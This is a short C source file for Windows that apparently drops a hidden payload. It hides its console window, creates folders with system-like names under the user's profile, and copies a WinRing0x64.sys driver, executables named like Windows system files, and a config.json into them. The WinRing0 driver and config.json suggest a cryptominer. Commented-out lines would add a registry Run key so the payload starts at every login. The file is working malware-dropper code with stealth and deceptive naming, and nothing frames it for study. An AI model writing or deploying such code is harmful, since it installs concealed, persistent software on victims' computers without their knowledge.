#include <stdio.h>
#include <windows.h>






int main(){

    HWND stealth;
    AllocConsole();
    stealth = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    system("mkdir \"\%userprofile\%\\application data\\WIN32\"");
    system("mkdir \"\%userprofile\%\\application data\\System\"");
    system("copy WinRing0x64.sys \"\%userprofile\%\\application data\\WIN32\"");
    system("copy Win32.exe \"\%userprofile\%\\application data\\WIN32\"");
    system("copy System32.exe \"\%userprofile\%\\application data\\WIN32\"");
    system("copy config.json \"\%userprofile\%\\application data\\WIN32\"");
    system("copy Sys32.exe \"\%userprofile\%\\application data\\System\"");
    //system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v sys32 /f");
    //system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v sys32 /t REG_SZ /d \"\%userprofile\%\\application data\\WIN32\\Win32.exe\" /f");
    return 0;
}
